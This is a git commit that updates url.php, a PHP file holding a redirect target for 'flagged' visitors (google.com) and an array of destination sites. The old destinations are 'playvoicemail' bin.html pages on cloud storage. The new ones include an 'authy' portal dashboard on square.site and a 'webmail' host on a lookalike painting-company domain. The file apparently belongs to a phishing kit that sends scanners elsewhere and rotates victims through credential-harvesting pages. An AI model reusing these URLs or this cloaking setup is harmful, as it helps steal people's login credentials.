0b601e52111533e71456e6ea9681870908be4c1b
JUPITAH01 <97876235+JUPITAH01@users.noreply.github.com>
2022-01-17 09:27:07 +0100

    Update url.php

--- url.php
+++ url.php
@@ -1,6 +1,6 @@
 <?php
 
 $redirectUrlIfFlag = "https://www.google.com";
-$sites = ["https://playvoicemail-id526274847156882676539357795434.s3.ap.cloud-object-storage.appdomain.cloud/bin.html#","https://playvoicemail-id622031500036052888906208662348.s3.ap.cloud-object-storage.appdomain.cloud/bin.html#","https://playvoicemail-id438267503658277909831050716524.s3.ap.cloud-object-storage.appdomain.cloud/bin.html#","https://playvm45345234.s3.ap.cloud-object-storage.appdomain.cloud/bin.html#","https://vm5423443.s3.eu.cloud-object-storage.appdomain.cloud/bin.html#"];
+$sites = ["https://rifalifesciences.com","https://1n1portal-dashboard-authy.square.site","https://webmail.armourscustornpainting.com/"];
 
 ?>
